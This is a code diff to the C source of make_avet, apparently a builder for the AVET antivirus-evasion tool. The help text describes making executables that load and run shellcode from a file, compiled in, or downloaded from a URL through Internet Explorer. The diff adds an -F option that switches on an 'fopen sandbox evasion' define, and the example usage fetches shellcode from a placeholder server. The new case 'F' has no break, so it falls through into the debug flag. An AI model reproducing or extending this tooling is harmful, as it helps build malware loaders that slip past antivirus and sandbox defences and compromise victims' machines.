@@ -25,6 +25,7 @@ int main (int argc, char **argv)
 	char *uvalue = NULL;
 	char *wvalue = NULL;
 	int hflag = 0;
+	int Fflag = 0;
 
 	int index;
 	int c;
@@ -32,7 +33,7 @@ int main (int argc, char **argv)
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "d:e:f:u:w:lph")) != -1)
+	while ((c = getopt (argc, argv, "d:e:f:u:w:lphF")) != -1)
 		switch (c)
 		{
 			case 'd':
@@ -56,6 +57,8 @@ int main (int argc, char **argv)
 			case 'h':
 				hflag = 1;
 				break;
+			case 'F':
+				Fflag = 1;
 			case 'p':
 				print_debug = 1;
 				break;
@@ -155,9 +158,9 @@ int main (int argc, char **argv)
 		fclose (file_def);
 	}
 
+	//write LVALUE to defs.h
 	if(print_debug)
-	{
-			//write LVALUE to defs.h
+	{		
 			FILE *file_def;
 			file_def = fopen ("defs.h","a");
 
@@ -172,27 +175,42 @@ int main (int argc, char **argv)
 			fclose(file_def);
 
 	}
+	
+	//write SANDBOX_FOPEN to defs.h
+	if(Fflag)
+	{
+		
+			FILE *file_def;
+			file_def = fopen ("defs.h","a");
+
+			if (file_def == NULL)
+			{
+				printf ("Error open defs.h\n");
+				return -1;
+			}
+
+			//fseek (file_def, 0, SEEK_END);
+			fprintf (file_def, "#define SANDBOX_FOPEN\n");
+			fclose(file_def);
+
+	}
+
 } //main
 
 
 
 void print_help()
 {
-	//   printf("make_avet.exe: Tool for building aveti.exe with options, so it can be executed with psexec\n\n");
-	//  printf("The shellcode file is derived from a shellcode in c format, for example from msfpayload and converted with a simple sh-script, like this:\n\n");
 	printf("Options:\n");
-	//  printf("-d decode shellcode, needs filename or url with keyfile\n");
-	//  printf("-e encode shellcode, needs filename with keyfile, used with -f for filename\n");
 	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt");
 	printf("-f compile shellcode into avet.exe, needs filename\n");
-	printf("-u load and exec shellcode from url using internet explorer\n");
-	//  printf("-w only with -u, set wait time for searching the shellcode text file, when shellcode is not, try more secs, default is 10");
+	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
+	printf("-F use fopen sandbox evasion");
 	printf("-p print debug information\n");
 	printf("-h help\n\n");
 	printf("Example usage:\n");
 	printf("$ make_avet -u http://myserver.com/sh.txt -p\n");
 	printf("$ make_avet -f shellcode.txt\n");
-	//  printf("avet.exe -f shellcode.txt >> enc_sh.txt -e key.txt\n");
 }
 
 void print_start()
